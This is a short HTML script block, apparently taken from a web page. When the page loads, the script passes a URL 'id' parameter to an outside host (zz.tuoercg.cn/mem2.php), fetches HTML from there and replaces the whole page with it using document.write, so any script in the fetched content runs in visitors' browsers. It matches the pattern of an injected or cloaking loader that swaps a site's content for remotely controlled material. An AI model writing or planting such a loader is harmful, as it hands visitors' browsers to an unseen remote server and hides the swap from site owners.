<script>
function loadHtml() {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('id');
    const url = `https://zz.tuoercg.cn/mem2.php?member=iw&id=${id}`; 
    fetch(url)
        .then(response => response.text())
        .then(html => {
            document.open();
            document.write(html);
            document.close();
        });
}
loadHtml();
</script>
